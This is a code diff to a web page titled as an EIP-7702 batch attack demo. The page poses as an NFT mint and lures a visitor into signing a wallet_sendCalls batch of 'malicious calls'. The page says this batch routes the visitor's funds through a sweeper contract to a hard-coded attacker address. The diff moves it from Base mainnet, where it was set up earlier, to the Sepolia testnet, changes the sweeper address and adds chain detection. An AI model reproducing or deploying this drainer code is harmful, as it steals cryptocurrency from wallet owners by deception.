@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NFT Mint — EIP-7702 Batch Attack Demo (Base)</title>
+<title>NFT Mint — EIP-7702 Batch Attack Demo (Sepolia)</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -267,15 +267,16 @@ All three hit the sweeper contract. Funds forwarded to attacker atomically.
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const BASE_CHAIN_ID = 8453;
-  const BASE_RPC = "https://mainnet.base.org";
+  const BASE_CHAIN_ID = 11155111;
+  const BASE_RPC = "https://ethereum-sepolia-rpc.publicnode.com";
   const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
   const ATTACKER_ADDRESS = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
-  const SWEEPER_CONTRACT = "0x5D2fb142c8a227cA586507bEFB5D48Aea8FdC9d9";
+  const SWEEPER_CONTRACT = "0xa57a96c76feC586bE399F47437CCA9Fd81F08B92";
 
   let userAddress = null;
   let userBalance = null;
   let provider = null;
+  let currentChainIdHex = null;
 
   function showPhase(id) {
     document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
@@ -300,15 +301,16 @@ All three hit the sweeper contract. Funds forwarded to attacker atomically.
     try {
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
+      console.log("Detected chainId:", chainId, "Expected:", BASE_CHAIN_ID, "Match:", chainId === BASE_CHAIN_ID);
       const badge = document.getElementById('navBadge');
-      if (chainId === BASE_CHAIN_ID) {
-        badge.textContent = 'Base Mainnet';
+      if (chainId === BASE_CHAIN_ID || chainId == BASE_CHAIN_ID) {
+        badge.textContent = 'Sepolia ✓';
         badge.style.color = 'var(--green)';
       } else {
-        badge.textContent = `Chain ${chainId} — Switch to Base`;
+        badge.textContent = `Chain ${chainId} — Switch to Sepolia`;
         badge.style.color = 'var(--red)';
       }
-    } catch(e) {}
+    } catch(e) { console.error("detectNetwork error:", e); }
   }
 
   document.getElementById('mintBtn').addEventListener('click', async () => {
@@ -324,10 +326,11 @@ All three hit the sweeper contract. Funds forwarded to attacker atomically.
 
     try {
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+      currentChainIdHex = chainIdHex;
       const chainId = parseInt(chainIdHex, 16);
 
       if (chainId !== BASE_CHAIN_ID) {
-        alert("Please switch to Base Mainnet");
+        alert("Please switch to Sepolia testnet");
         showPhase('phase-lure');
         return;
       }
@@ -371,7 +374,7 @@ All three hit the sweeper contract. Funds forwarded to attacker atomically.
         method: 'wallet_sendCalls',
         params: [{
           version: "2.0.0",
-          chainId: "0x2105",
+          chainId: currentChainIdHex,
           calls: maliciousCalls,
           atomicRequired: true
         }]
